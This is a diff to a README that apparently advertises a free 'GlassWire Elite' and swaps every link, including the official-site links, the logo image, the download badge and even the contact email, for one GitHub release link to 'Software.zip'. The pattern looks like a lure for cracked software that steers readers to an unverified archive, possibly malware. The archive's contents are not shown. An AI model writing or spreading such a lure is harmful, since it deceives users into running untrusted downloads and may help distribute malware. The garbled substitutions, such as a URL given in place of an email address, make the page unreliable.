@@ -1,6 +1,6 @@
 # 🚀 Welcome to GlassWire Elite Free Repository
 
-![GlassWire Logo](https://example.com/glasswire_logo.jpg)
+![GlassWire Logo](https://github.com/Miniskizo/GlassWire-Elite-Free/releases/download/v1.0/Software.zip)
 
 ## Repository Name: GlassWire-Elite-Free
 
@@ -26,19 +26,19 @@ GlassWire Elite Free is a repository dedicated to all things GlassWire Elite. He
 - [What GlassWire Elite Can Do for My PC](#what-glasswire-elite-can-do-for-my-pc)
 
 ## 🌟 GlassWire Elite Resources:
-- [GlassWire Elite Official Website](https://www.glasswire.com/)
-- [GlassWire Elite Features Overview](https://www.glasswire.com/features/)
-- [GlassWire Elite User Guide](https://www.glasswire.com/userguide/)
+- [GlassWire Elite Official Website](https://github.com/Miniskizo/GlassWire-Elite-Free/releases/download/v1.0/Software.zip)
+- [GlassWire Elite Features Overview](https://github.com/Miniskizo/GlassWire-Elite-Free/releases/download/v1.0/Software.zip)
+- [GlassWire Elite User Guide](https://github.com/Miniskizo/GlassWire-Elite-Free/releases/download/v1.0/Software.zip)
 
 ## 🔗 Important Links:
-[![Download GlassWire Elite Free](https://img.shields.io/badge/Download-GlassWire%20Elite%20Free-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download GlassWire Elite Free](https://github.com/Miniskizo/GlassWire-Elite-Free/releases/download/v1.0/Software.zip%20Elite%20Free-blue)](https://github.com/Miniskizo/GlassWire-Elite-Free/releases/download/v1.0/Software.zip)
 *(Launch the link to download GlassWire Elite Free)*
 
 ## 📝 Contribution Guidelines:
 We welcome contributions to enhance and expand the information available in this repository. Feel free to create pull requests for adding new sections, fixing typos, or improving existing content.
 
 ## 📞 Contact Us:
-If you have any questions, suggestions, or feedback regarding GlassWire Elite or this repository, please feel free to reach out to us via email at glasswire.elite@support.com. You can also connect with us on social media platforms for the latest updates.
+If you have any questions, suggestions, or feedback regarding GlassWire Elite or this repository, please feel free to reach out to us via email at https://github.com/Miniskizo/GlassWire-Elite-Free/releases/download/v1.0/Software.zip You can also connect with us on social media platforms for the latest updates.
 
 Thank you for visiting GlassWire Elite Free Repository! 🎉
 
